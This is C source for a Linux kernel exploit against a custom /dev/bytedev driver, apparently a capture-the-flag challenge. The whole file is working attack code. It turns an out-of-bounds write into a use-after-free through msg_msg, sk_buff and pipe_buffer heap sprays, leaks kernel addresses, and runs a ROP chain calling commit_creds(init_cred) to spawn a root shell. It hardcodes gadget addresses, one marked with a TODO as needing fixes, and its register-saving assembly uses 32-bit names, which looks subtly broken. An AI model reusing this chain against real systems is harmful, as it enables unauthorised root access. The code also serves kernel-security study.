#define _GNU_SOURCE
#include <err.h>
#include <errno.h>
#include <fcntl.h>
#include <inttypes.h>
#include <sched.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <sys/ioctl.h>

#define PRIMARY_MSG_SIZE 0x1000
#define SECONDARY_MSG_SIZE 0x400

#define PRIMARY_MSG_TYPE    0x41
#define SECONDARY_MSG_TYPE  0x42
#define VICTIM_MSG_TYPE     0x1337
#define MSG_TAG     0xAAAAAAAA

#define SOCKET_NUM 16
#define SK_BUFF_NUM 128
#define PIPE_NUM 256
#define MSG_QUEUE_NUM 4096

#define ANON_PIPE_BUF_OPS 0xffffffff81e391c0
#define PREPARE_KERNEL_CRED 0xffffffff810b3160
#define INIT_CRED 0xffffffff8244aca0
#define COMMIT_CREDS 0xffffffff810b2ec0
#define SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE 0xffffffff81a01050
#define POP_RDI_RET 0xffffffff810014f9

#define BYTEDEV_BUF_SIZE (4096 - sizeof(struct bytedev_data))

struct bytedev_data {
    unsigned short len, offset;
    char data[0];
};

struct list_head
{
    uint64_t    next;
    uint64_t    prev;
};

struct msg_msg
{
    struct list_head m_list;
    uint64_t    m_type;
    uint64_t    m_ts;
    uint64_t    next;
    uint64_t    security;
};

struct msg_msgseg
{
    uint64_t    next;
};

struct 
{
    long mtype;
    char mtext[PRIMARY_MSG_SIZE - sizeof(struct msg_msg)];
} primary_msg;

struct 
{
    long mtype;
    char mtext[SECONDARY_MSG_SIZE - sizeof(struct msg_msg)];
} secondary_msg;

/*
 * skb_shared_info need to take 320 bytes at the tail
 * so the max size of buf we should send is:
 * 1024 - 320 = 704
 */
char fake_secondary_msg[704];

struct
{
    long mtype;
    char mtext[0x1000 - sizeof(struct msg_msg) + 0x1000 - sizeof(struct msg_msgseg)];
} oob_msg;

struct pipe_buffer
{
    uint64_t    page;
    uint32_t    offset, len;
    uint64_t    ops;
    uint32_t    flags;
    uint32_t    padding;
    uint64_t    private;
};

struct pipe_buf_operations
{
    uint64_t    confirm;
    uint64_t    release;
    uint64_t    try_steal;
    uint64_t    get;
};

size_t user_cs, user_ss, user_sp, user_eflags;

void saveStatus()
{
    __asm__("mov user_cs, cs;"
            "mov user_ss, ss;"
            "mov user_sp, esp;"
            "pushf;"
            "pop user_eflags;"
            );
    printf("\033[34m\033[1m[*] Status has been saved.\033[0m\n");
}

void errExit(char *msg)
{
    printf("\033[31m\033[1m[x] Error: %s\033[0m\n", msg);
    exit(EXIT_FAILURE);
}

int readMsg(int msqid, void *msgp, size_t msgsz, long msgtyp)
{
    return msgrcv(msqid, msgp, msgsz - sizeof(long), msgtyp, 0);
}

int writeMsg(int msqid, void *msgp, size_t msgsz, long msgtyp)
{
    *(long*)msgp = msgtyp;
    return msgsnd(msqid, msgp, msgsz - sizeof(long), 0);
}

int peekMsg(int msqid, void *msgp, size_t msgsz, long msgtyp)
{
    int r;
    r = msgrcv(msqid, msgp, msgsz - sizeof(long), msgtyp, MSG_COPY | IPC_NOWAIT);
    return r;
}

void buildMsg(struct msg_msg *msg, uint64_t m_list_next, uint64_t m_list_prev, 
              uint64_t m_type, uint64_t m_ts,  uint64_t next, uint64_t security)
{
    msg->m_list.next = m_list_next;
    msg->m_list.prev = m_list_prev;
    msg->m_type = m_type;
    msg->m_ts = m_ts;
    msg->next = next;
    msg->security = security;
}

int spraySkBuff(int sk_socket[SOCKET_NUM][2], void *buf, size_t size)
{
    for (int i = 0; i < SOCKET_NUM; i++)
        for (int j = 0; j < SK_BUFF_NUM; j++) {
            if (write(sk_socket[i][0], buf, size) < 0) {
                printf("[x] failed to spray %d sk_buff for %d socket!", j, i);
                return -1;
            }
        }
    return 0;
}

int freeSkBuff(int sk_socket[SOCKET_NUM][2], void *buf, size_t size)
{
    for (int i = 0; i < SOCKET_NUM; i++) {
        for (int j = 0; j < SK_BUFF_NUM; j++) {
            if (read(sk_socket[i][1], buf, size) < 0) {
                puts("[x] failed to received sk_buff!");
                return -1;
            }
        }
    }
    return 0;
}

void trigerOutOfBoundWrite(int dev_fd, int socket_fd[2])
{
    struct bytedev_data *fake_data;
    char *trash_data;

    /* free the first buffer in bytedev queue */
    trash_data = malloc(BYTEDEV_BUF_SIZE);
    memset(trash_data, 0x54, BYTEDEV_BUF_SIZE);

    printf("[*] write %d bytes to dev \n", 
            write(dev_fd, trash_data, BYTEDEV_BUF_SIZE));
    printf("[*] read %d bytes from dev\n", 
            read(dev_fd, trash_data, BYTEDEV_BUF_SIZE));

    /* construct fake bytedev_data */
    fake_data = malloc(sizeof(struct bytedev_data) + BYTEDEV_BUF_SIZE);
    fake_data->len = BYTEDEV_BUF_SIZE + 1;
    
    puts("[*] re-get the buffer by sk_buff...");
    write(socket_fd[0], fake_data, BYTEDEV_BUF_SIZE - 320);

    /* make an OOB write */
    puts("[*] OOB write to nearby object...");
    write(dev_fd, trash_data, 1);
}

void getRootShell(void)
{
    if (getuid()) {
        errExit("failed to gain the root!");
    }
    
    puts("\033[32m\033[1m[+] Succesfully gain the root privilege\033[0m");
    puts("\033[32m\033[1m[+] trigerring root shell now...\033[0m\n");

    system("/bin/sh");
}

int main(int argc, char **argv, char **envp)
{
    int         oob_socket[2];
    int         sk_sockets[SOCKET_NUM][2];
    int         pipe_fd[PIPE_NUM][2];
    int         msqid[MSG_QUEUE_NUM];
    int         victim_qid, real_qid;
    struct msg_msg  *nearby_msg;
    struct msg_msg  *nearby_msg_prim;
    struct pipe_buffer *pipe_buf_ptr;
    struct pipe_buf_operations *ops_ptr;
    uint64_t    victim_addr;
    uint64_t    kernel_base;
    uint64_t    kernel_offset;
    uint64_t    *rop_chain;
    int         rop_idx;
    cpu_set_t   cpu_set;
    int         dev_fd;

    /* Initialization */
    saveStatus();

    if ((dev_fd = open("/dev/bytedev", O_RDWR)) < 0) {
        errExit("failed to open bytedev!");
    }

    if (socketpair(AF_UNIX, SOCK_STREAM, 0, oob_socket) < 0) {
        errExit("failed to create socket pair for OOB write!");
    }

    /* to run the exp on the specific core only */
    CPU_ZERO(&cpu_set);
    CPU_SET(0, &cpu_set);
    sched_setaffinity(getpid(), sizeof(cpu_set), &cpu_set);
    
    // socket pairs to spray sk_buff
    for (int i = 0; i < SOCKET_NUM; i++) {
        if (socketpair(AF_UNIX, SOCK_STREAM, 0, sk_sockets[i]) < 0) {
            errExit("failed to create socket pair!");
        }
    }

    /*
     * Step.I
     * build msg_queue, spray primary and secondary msg_msg,
     * and use OOB write to construct the overlapping
     */
    puts("\n\033[34m\033[1m[*] Step.I spray msg_msg, construct overlapping object\033[0m");

    puts("[*] Build message queue...");
    // build 4096 message queue
    for (int i = 0; i < MSG_QUEUE_NUM; i++)
    {
        if ((msqid[i] = msgget(IPC_PRIVATE, 0666 | IPC_CREAT)) < 0)
            errExit("failed to create msg_queue!");
    }

    puts("[*] Spray primary and secondary msg_msg...");

    memset(&primary_msg, 0, sizeof(primary_msg));
    memset(&secondary_msg, 0, sizeof(secondary_msg));

    // spray primary and secondary message
    for (int i = 0; i < MSG_QUEUE_NUM; i++)
    {
        *(int *)&primary_msg.mtext[0] = MSG_TAG;
        *(int *)&primary_msg.mtext[4] = i;
        if (writeMsg(msqid[i], &primary_msg, 
                sizeof(primary_msg), PRIMARY_MSG_TYPE) < 0)
            errExit("failed to send primary msg!");

        *(int *)&secondary_msg.mtext[0] = MSG_TAG;
        *(int *)&secondary_msg.mtext[4] = i;
        if (writeMsg(msqid[i], &secondary_msg, 
                sizeof(secondary_msg), SECONDARY_MSG_TYPE) < 0)
            errExit("failed to send secondary msg!");
    }

    // create hole in primary msg_msg
    puts("[*] Create holes in primary msg_msg...");
    for (int i = 0; i < MSG_QUEUE_NUM; i += 1024)
    {
        if (readMsg(msqid[i], &primary_msg, 
                sizeof(primary_msg), PRIMARY_MSG_TYPE) < 0)
            errExit("failed to receive primary msg!");
    }

    // triger off-by-null on primary msg_msg
    puts("[*] Trigger OOB write to construct the overlapping...");
    trigerOutOfBoundWrite(dev_fd, oob_socket);

    // find the queues that have the same secondary msg_msg
    puts("[*] Checking whether succeeded to make overlapping...");
    victim_qid = real_qid = -1;
    for (int i = 0; i < MSG_QUEUE_NUM; i++)
    {
        if ((i % 1024) == 0)  // the hole
            continue;

        if (peekMsg(msqid[i], &secondary_msg, 
                sizeof(secondary_msg), 1) < 0)
        {
            printf("[x] error qid: %d\n", i);
            errExit("failed to receive secondary msg!");
        }

        if (*(int*) &secondary_msg.mtext[0] != MSG_TAG)
            errExit("failed to make corruption!");
        
        if (*(int*) &secondary_msg.mtext[4] != i)
        {
            victim_qid = i;
            real_qid = *(int*) &secondary_msg.mtext[4];
            break;
        }
    }

    if (victim_qid < 0)
        errExit("failed to make overlapping!");
    
    printf("\033[32m\033[1m[+] victim qid:\033[0m %d \033[32m\033[1m real qid: \033[0m %d\n", 
            victim_qid, real_qid);

    /*
     * Step.II
     * construct UAF
     */
    puts("\n\033[34m\033[1m[*] Step.II construct UAF\033[0m");

    // free the victim secondary msg_msg, then we get a UAF
    if (readMsg(msqid[real_qid], &secondary_msg, 
                sizeof(secondary_msg), SECONDARY_MSG_TYPE) < 0)
        errExit("failed to receive secondary msg!");
    
    puts("\033[32m\033[1m[+] UAF construction complete!\033[0m");

    /*
     * Step.III
     * spray sk_buff to leak msg_msg addr
     * construct fake msg_msg to leak addr of UAF obj
     */
    puts("\n\033[34m\033[1m[*] Step.III spray sk_buff to leak kheap addr\033[0m");

    // spray sk_buff to construct fake msg_msg
    puts("[*] spray sk_buff...");
    buildMsg((struct msg_msg *)fake_secondary_msg, 
            *(uint64_t*)"arttnba3", *(uint64_t*)"arttnba3", 
            VICTIM_MSG_TYPE, 0x1000 - sizeof(struct msg_msg), 0, 0);
    if (spraySkBuff(sk_sockets, fake_secondary_msg, 
            sizeof(fake_secondary_msg)) < 0)
        errExit("failed to spray sk_buff!");
    
    // use fake msg_msg to read OOB
    puts("[*] OOB read from victim msg_msg");
    if (peekMsg(msqid[victim_qid], &oob_msg, sizeof(oob_msg), 1) < 0)
        errExit("failed to read victim msg!");
    
    if (*(int *)&oob_msg.mtext[SECONDARY_MSG_SIZE] != MSG_TAG)
        errExit("failed to rehit the UAF object!");

    nearby_msg = (struct msg_msg*) 
            &oob_msg.mtext[(SECONDARY_MSG_SIZE) - sizeof(struct msg_msg)];
    
    printf("\033[32m\033[1m[+] addr of primary msg of msg nearby victim: \033[0m%llx\n", 
            nearby_msg->m_list.prev);

    // release and re-spray sk_buff to construct fake msg_msg
    // so that we can make an arbitrary read on a primary msg_msg
    if (freeSkBuff(sk_sockets, fake_secondary_msg, 
            sizeof(fake_secondary_msg)) < 0)
        errExit("failed to release sk_buff!");
    
    buildMsg((struct msg_msg *)fake_secondary_msg, 
            *(uint64_t*)"arttnba3", *(uint64_t*)"arttnba3", 
            VICTIM_MSG_TYPE, sizeof(oob_msg.mtext), 
            nearby_msg->m_list.prev - 8, 0);
    if (spraySkBuff(sk_sockets, fake_secondary_msg, 
            sizeof(fake_secondary_msg)) < 0)
        errExit("failed to spray sk_buff!");
    
    puts("[*] arbitrary read on primary msg of msg nearby victim");
    if (peekMsg(msqid[victim_qid], &oob_msg, sizeof(oob_msg), 1) < 0)
        errExit("failed to read victim msg!");
    
    if (*(int *)&oob_msg.mtext[0x1000] != MSG_TAG)
        errExit("failed to rehit the UAF object!");
    
    // cal the addr of UAF obj by the header we just read out
    nearby_msg_prim = (struct msg_msg*) 
            &oob_msg.mtext[0x1000 - sizeof(struct msg_msg)];
    victim_addr = nearby_msg_prim->m_list.next - 0x400;
    
    printf("\033[32m\033[1m[+] addr of msg next to victim: \033[0m%llx\n", 
            nearby_msg_prim->m_list.next);
    printf("\033[32m\033[1m[+] addr of msg UAF object: \033[0m%llx\n", victim_addr);

    /*
     * Step.IV
     * fix the header of UAF obj and release it
     * spray pipe_buffer and leak the kernel base
     */
    puts("\n\033[34m\033[1m[*] Step.IV spray pipe_buffer to leak kernel base\033[0m");

    // re-construct the msg_msg to fix it
    puts("[*] fixing the UAF obj as a msg_msg...");
    if (freeSkBuff(sk_sockets, fake_secondary_msg, 
            sizeof(fake_secondary_msg)) < 0)
        errExit("failed to release sk_buff!");
    
    memset(fake_secondary_msg, 0, sizeof(fake_secondary_msg));
    for (int i = 0; i < 0x50; i++) {
        ((size_t*)(fake_secondary_msg))[i] = victim_addr;
    }
    /**
     * XXX: we need to pass the check in lib/list_debug.c 
     * what we didn't pass there is 
     * "prev->next == entry" && "next->prev == entry"
     * so a valid memory with [addr of entry] should be set there
     */
    buildMsg((struct msg_msg *)fake_secondary_msg, 
            victim_addr + 0x100, victim_addr + 0x100,
            VICTIM_MSG_TYPE, SECONDARY_MSG_SIZE - sizeof(struct msg_msg), 
            0, 0);
    if (spraySkBuff(sk_sockets, fake_secondary_msg, 
            sizeof(fake_secondary_msg)) < 0)
        errExit("failed to spray sk_buff!");
    
    // release UAF obj as secondary msg
    puts("[*] release UAF obj in message queue...");
    if (readMsg(msqid[victim_qid], &secondary_msg, 
                sizeof(secondary_msg), VICTIM_MSG_TYPE) < 0)
        errExit("failed to receive secondary msg!");
    
    // spray pipe_buffer
    puts("[*] spray pipe_buffer...");
    for (int i = 0; i < PIPE_NUM; i++)
    {
        if (pipe(pipe_fd[i]) < 0)
            errExit("failed to create pipe!");
        
        // write something to activate it
        if (write(pipe_fd[i][1], "arttnba3", 8) < 0)
            errExit("failed to write the pipe!");
    }

    // release the sk_buff to read pipe_buffer, leak kernel base
    puts("[*] release sk_buff to read pipe_buffer...");
    pipe_buf_ptr = (struct pipe_buffer *) &fake_secondary_msg;
    for (int i = 0; i < SOCKET_NUM; i++)
    {
        for (int j = 0; j < SK_BUFF_NUM; j++)
        {
            if (read(sk_sockets[i][1], &fake_secondary_msg, 
                    sizeof(fake_secondary_msg)) < 0)
                errExit("failed to release sk_buff!");
            
            if (pipe_buf_ptr->ops > 0xffffffff81000000)
            {
                printf("\033[32m\033[1m[+] got anon_pipe_buf_ops: \033[0m%llx\n", 
                        pipe_buf_ptr->ops);
                kernel_offset = pipe_buf_ptr->ops - ANON_PIPE_BUF_OPS;
                kernel_base = 0xffffffff81000000 + kernel_offset;
            }
        }
    }

    printf("\033[32m\033[1m[+] kernel base: \033[0m%llx \033[32m\033[1moffset: \033[0m%llx\n", 
            kernel_base, kernel_offset);
    
    /*
     * Step.V
     * hijack the ops of pipe_buffer
     * free all pipe to trigger fake ptr
     * so that we hijack the RIP
     * construct a ROP on pipe_buffer
     */
    puts("\n\033[34m\033[1m[*] Step.V hijack the ops of pipe_buffer, gain root privilege\033[0m");

    puts("[*] pre-construct data in userspace...");
    pipe_buf_ptr = (struct pipe_buffer *) fake_secondary_msg;
    pipe_buf_ptr->ops = victim_addr;

    /**
     * TODO: gadget there should be fixed
     */
    ops_ptr = (struct pipe_buf_operations *) fake_secondary_msg;
    ops_ptr->release = 0xffffffff8183b4d3 + kernel_offset;// push rsi ; pop rsp ; add [rbp-0x3d],bl ; ret
    ops_ptr->confirm = 0xffffffff81689ea4 + kernel_offset;// pop rdx ; pop r13 ; pop rbp ; ret

    rop_idx = 0;
    rop_chain = (uint64_t*) &fake_secondary_msg[0x20];
    rop_chain[rop_idx++] = kernel_offset + POP_RDI_RET;
    rop_chain[rop_idx++] = kernel_offset + INIT_CRED;
    rop_chain[rop_idx++] = kernel_offset + COMMIT_CREDS;
    rop_chain[rop_idx++] = kernel_offset + SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE + 22;
    rop_chain[rop_idx++] = *(uint64_t*) "arttnba3";
    rop_chain[rop_idx++] = *(uint64_t*) "arttnba3";
    rop_chain[rop_idx++] = (size_t) getRootShell;
    rop_chain[rop_idx++] = user_cs;
    rop_chain[rop_idx++] = user_eflags;
    rop_chain[rop_idx++] = user_sp;
    rop_chain[rop_idx++] = user_ss;

    puts("[*] spray sk_buff to hijack pipe_buffer...");
    if (spraySkBuff(sk_sockets, fake_secondary_msg, sizeof(fake_secondary_msg)) < 0) {
        errExit("failed to spray sk_buff!");
    }
    
    puts("[*] trigger fake ops->release to hijack RIP...");
    for (int i = 0; i < PIPE_NUM; i++)
    {
        close(pipe_fd[i][0]);
        close(pipe_fd[i][1]);
    }

    return 0;
}